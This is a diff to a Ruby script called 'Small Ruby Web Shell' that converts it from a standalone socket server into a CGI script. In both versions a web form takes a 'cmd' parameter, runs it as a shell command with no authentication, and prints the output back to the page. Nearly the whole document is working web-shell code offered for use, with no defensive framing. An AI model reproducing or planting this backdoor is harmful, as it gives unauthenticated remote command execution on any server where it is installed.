@@ -2,31 +2,19 @@
 # frozen_string_literal: true
 
 # Small Ruby Web Shell
-# This a Ruby web shell written with sockets only
 
-require 'socket'
 require 'cgi'
 
-ipaddr, port = ARGV.size == 2 ? ARGV[0..] : ['localhost', 4000]
-http = TCPServer.new(ipaddr, port)
-response = DATA.read
+print "Content-type: text/html\r\n\r\n"
 
-puts("Pure HTTP server started at #{ipaddr}:#{port}")
+cgi = CGI.new
+html = DATA.read
 
-while con = http.accept
-  data = con.gets
-  output = ''
-
-  if data =~ %r{/\?cmd=(.*)\sHTTP}
-    output = %x(#{CGI.unescape($1)}) rescue "Command error: #{$1}"
-  end
-
-  con.print('HTTP/1.1 200 OK\r\n')
-  con.print('Content-Type: text/html\r\n\r\n')
-  con.puts(response % output)
-
-  con.close
+if cgi["cmd"]
+  output = %x(#{CGI.unescape(cgi['cmd'])}) rescue "Command error: #{cgi['cmd']}"
 end
+
+puts html % [File.basename($0), output]
 
 __END__
 <html>
@@ -34,11 +22,11 @@ __END__
   <meta charset="utf-8">
 </head>
 <body style="font-family: monospace; text-align: center">
-  <form action="/" method="get">
+  <form action="/cgi-bin/%s" method="get">
     <h1>Small Ruby Web Shell</h1>
     <input type="text" placeholder="ls -la" name="cmd">
     <input type="submit" value="Run">
   </form>
-  <textarea readonly style="background-color: black; color: lime">%s</textarea>
+  <textarea readonly style="background-color: black; color: lime; width: 512; border: none; padding: 10px" rows="16">%s</textarea>
 <body>
 </html>
